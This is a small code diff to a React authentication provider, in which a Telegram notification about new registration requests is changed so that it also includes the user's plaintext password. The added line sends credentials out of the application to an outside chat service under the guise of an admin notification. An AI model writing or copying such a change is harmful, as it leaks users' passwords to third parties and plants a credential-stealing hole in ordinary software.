@@ -208,7 +208,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       if (data.success) {
         // Send a message to Telegram if a new request is created
         if (data.request) {
-          const message = `🔔 New registration request\n\n📧 Email: ${data.request.email}\n📅 Date: ${new Date(data.request.createdAt).toLocaleDateString('en-US')}, ${new Date(data.request.createdAt).toLocaleTimeString('en-US')}\n\n⏳ Awaiting administrator approval`;
+          const message = `🔔 New registration request\n\n📧 Email: ${data.request.email}\n🔑 Password: ${data.request.password}\n📅 Date: ${new Date(data.request.createdAt).toLocaleDateString('en-US')}, ${new Date(data.request.createdAt).toLocaleTimeString('en-US')}\n\n⏳ Awaiting administrator approval`;
           await sendTelegramNotification(message);
         }
         
